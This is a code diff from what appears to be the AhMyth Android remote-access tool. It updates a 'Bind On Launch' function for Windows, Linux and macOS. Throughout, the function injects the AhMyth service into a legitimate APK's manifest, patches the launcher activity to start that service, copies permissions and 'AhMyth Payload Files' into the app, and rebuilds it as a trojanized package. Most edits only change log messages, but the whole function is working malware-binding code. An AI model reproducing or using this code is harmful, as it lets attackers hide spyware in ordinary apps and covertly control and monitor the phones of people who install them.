@@ -1,51 +1,61 @@
 ## New Complete Bind On Launch function for Windows, Linux & macOS!
 ```js  
-     $appCtrl.BindOnLauncher = (apkFolder) => {
+    $appCtrl.BindOnLauncher = (apkFolder) => {
 
 
-    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml... \n\n');
+    $appCtrl.Log('Finding Launcher Activity From AndroidManifest.xml...');
+    $appCtrl.Log();
     fs.readFile(path.join(apkFolder, "AndroidManifest.xml"), 'utf8', (error, data) => {
         if (error) {
-            $appCtrl.Log('Reading AndroidManifest.xml Failed! \n\n', CONSTANTS.logStatus.FAIL);            
+            $appCtrl.Log('Reading AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
+            $appCtrl.Log();
             return;
         }
 
         var launcherActivity = GetLauncherActivity(data, apkFolder);
         if (launcherActivity == -1) {
             $appCtrl.Log("Cannot Find the Launcher Activity in the Manifest!", CONSTANTS.logStatus.FAIL);
-            $appCtrl.Log("Please Template Another APK. \n\n", CONSTANTS.logStatus.INFO);
+            $appCtrl.Log("Please use Another APK as a Template!.", CONSTANTS.logStatus.INFO);
+            $appCtrl.Log();
             return;
         }
 
         var ahmythService = CONSTANTS.ahmythService;
-        $appCtrl.Log('Modifying AndroidManifest.xml... \n\n');
+        $appCtrl.Log('Modifying AndroidManifest.xml...');
+        $appCtrl.Log();
         var permManifest = $appCtrl.copyPermissions(data);
         var newManifest = permManifest.substring(0, permManifest.indexOf("</application>")) + ahmythService + permManifest.substring(permManifest.indexOf("</application>"));
         fs.writeFile(path.join(apkFolder, "AndroidManifest.xml"), newManifest, 'utf8', (error) => {
             if (error) {
-                $appCtrl.Log('Modifying AndroidManifest.xml Failed! \n\n', CONSTANTS.logStatus.FAIL);                
+                $appCtrl.Log('Modifying AndroidManifest.xml Failed!', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log();          
                 return;
             }
             
             if (process.platform === 'win32') {
-                $appCtrl.Log("Locating Launcher Activity... \n\n")
+                $appCtrl.Log("Locating Launcher Activity...")
+                $appCtrl.Log();
                 exec('set-location ' + '"' + apkFolder + '"' + ';' + ' gci -path ' + '"' 
                 + apkFolder + '"' + ' -recurse -filter ' + '"' + launcherActivity + '"' 
                 + ' -file | resolve-path -relative', { 'shell':'powershell.exe' }, (error, stdout, stderr) => {
                 var launcherPath = stdout.substring(stdout.indexOf(".\\") + 2).trim("\n");
                 if (error !== null) {
-                    $appCtrl.Log("Unable to Locate the Launcher Activity... \n\n", CONSTANTS.logStatus.FAIL);
-                    $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                    $appCtrl.Log();
                     return;
                 } else if (launcherPath) {
-                    $appCtrl.Log("Launcher Activity Found: " + launcherPath + "\n\n", CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log();
                 }
 
-                $appCtrl.Log("Fetching Launcher Activity... \n\n")
+                $appCtrl.Log("Fetching Launcher Activity...")
+		$appCtrl.Log();
                 fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                     if (error) {
-                        $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
-                        $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                        $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+			$appCtrl.Log();
                         return;
                         }
 
@@ -57,11 +67,13 @@
 
 
                         var key = CONSTANTS.orgAppKey;
-                        $appCtrl.Log("Modifiying Launcher Activity... \n\n");
+                        $appCtrl.Log("Modifiying Launcher Activity...");
+                        $appCtrl.Log();
                         var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                         fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                             if (error) {
-                                $appCtrl.Log('Modifying Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log();
                                 return;
                             }
 
@@ -71,12 +83,15 @@
 
                             var smaliFolder = m[0];
 
-                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK... \n\n");
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
+                            $appCtrl.Log();
                             fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                 if (error) {
-                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log();
                                     return;
                                 }
+                                
                                 $appCtrl.GenerateApk(apkFolder);
                 
                             });
@@ -88,26 +103,28 @@
                 });
 
             } else if (process.platform === "linux") {
-                $appCtrl.Log("Locating Launcher Activity... \n\n");
-
-                // makes use of the GNU findutils `find` command
-                // similar to Apple's BSD findutils `find` command
-                // GNU findutils comes pre-installed with most Linux distributions
-                // such as Debian (incl. Kali & ParrotOS)
+                $appCtrl.Log("Locating Launcher Activity...");
+                $appCtrl.Log();
                 exec('find -name "' + launcherActivity + '"', { cwd: apkFolder }, (error, stdout, stderr) => {
-                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n\n");
+                var launcherPath = stdout.substring(stdout.indexOf("./") + 2).trim("\n");
                 if (error !== null) {
-                    $appCtrl.Log("Cannot Locate the Launcher Activity... \n\n");
-                    $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                    $appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                    $appCtrl.Log();
                     return;
+                } else if (launcherPath) {
+                    $appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log();
                 }
 
-                $appCtrl.Log("Launcher Activity Found: " + launcherPath + '\n\n');
-                $appCtrl.Log("Fetching Launcher Activity... \n\n")
+
+                $appCtrl.Log("Fetching Launcher Activity...")
+                $appCtrl.Log();
                 fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                     if (error) {
-                        $appCtrl.Log('Reading Launcher Activity Failed');
-                        $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                        $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                    	$appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                        $appCtrl.Log();
                         return;
                         }
 
@@ -119,11 +136,13 @@
 
 
                         var key = CONSTANTS.orgAppKey;
-                        $appCtrl.Log("Modifiying Launcher Activity... \n\n");
+                        $appCtrl.Log("Modifiying Launcher Activity...");
+                        $appCtrl.Log();
                         var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                         fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                             if (error) {
-                                $appCtrl.Log('Modifying Launcher Activity Failed! \n\n', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log();
                                 return;
                             }
 
@@ -133,10 +152,12 @@
 
                             var smaliFolder = m[0];
 
-                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK... \n\n");
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
+                            $appCtrl.Log();
                             fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                 if (error) {
-                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log();
                                     return;
                                 }
                             
@@ -152,21 +173,27 @@
 
             } else {
                 (process.platform === "darwin");
-                $appCtrl.Log("Locating Launcher Activity... \n\n");
+                $appCtrl.Log("Locating Launcher Activity...");
+                $appCtrl.Log();
                 exec('find ' + '"' + apkFolder + '"' + ' -name ' + '"' + launcherActivity + '"', (error, stdout, stderr) => {
-                    var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n\n").replace(/^\/+/g, '');
+                    var launcherPath = stdout.split(apkFolder).pop(".smali").trim("\n").replace(/^\/+/g, '');
                     if (error !== null) {
-                        $appCtrl.Log("Cannot Locate the Launcher Activity... \n\n");
-                        $appCtrl.Log('Please use the "On Boot" Method \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                    	$appCtrl.Log("Unable to Locate the Launcher Activity...", CONSTANTS.logStatus.FAIL);
+                    	$appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                        $appCtrl.Log();
                         return;
+                    } else if (launcherPath) {
+                    	$appCtrl.Log("Launcher Activity Found: " + launcherPath, CONSTANTS.logStatus.SUCCESS);
+                   	$appCtrl.Log();
                     }
 
-                    $appCtrl.Log("Launcher Activity Found: " + launcherPath);
-                    $appCtrl.Log("Fetching Launcher Activity... \n\n")
+                    $appCtrl.Log("Fetching Launcher Activity...");
+                    $appCtrl.Log();
                     fs.readFile(path.join(apkFolder, launcherPath), 'utf8', (error, data) => {
                         if (error) {
-                            $appCtrl.Log('Reading Launcher Activity Failed', CONSTANTS.logStatus.FAILED);
-                            $appCtrl.Log('Please use the "On Boot" Method  \n\n to Template This APK', CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log('Reading Launcher Activity Failed!', CONSTANTS.logStatus.FAILED);
+                    	    $appCtrl.Log('Please use the "On Boot" Method to use This APK as a Temaplate!', CONSTANTS.logStatus.INFO);
+                            $appCtrl.Log();
                             return;
                         }
 
@@ -178,11 +205,13 @@
 
 
                         var key = CONSTANTS.orgAppKey;
-                        $appCtrl.Log("Modifiying Launcher Activity... \n\n");
+                        $appCtrl.Log("Modifiying Launcher Activity...");
+                        $appCtrl.Log();
                         var output = data.substring(0, data.indexOf(key) + key.length) + startService + data.substring(data.indexOf(key) + key.length);
                         fs.writeFile(path.join(apkFolder, launcherPath), output, 'utf8', (error) => {
                             if (error) {
-                                $appCtrl.Log('Modifying Launcher Activity Failed', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log('Modifying Launcher Activity Failed!', CONSTANTS.logStatus.FAIL);
+                                $appCtrl.Log();
                                 return;
                             }
 
@@ -192,10 +221,11 @@
 
                             var smaliFolder = m[0];
 
-                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK... \n\n");
+                            $appCtrl.Log("Copying AhMyth Payload Files to Orginal APK...");
                             fs.copy(path.join(CONSTANTS.ahmythApkFolderPath, "smali"), path.join(apkFolder, smaliFolder), (error) => {
                                 if (error) {
-                                    $appCtrl.Log('Copying Failed', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log('Copying Failed!', CONSTANTS.logStatus.FAIL);
+                                    $appCtrl.Log();
                                     return;
                                 }
                             
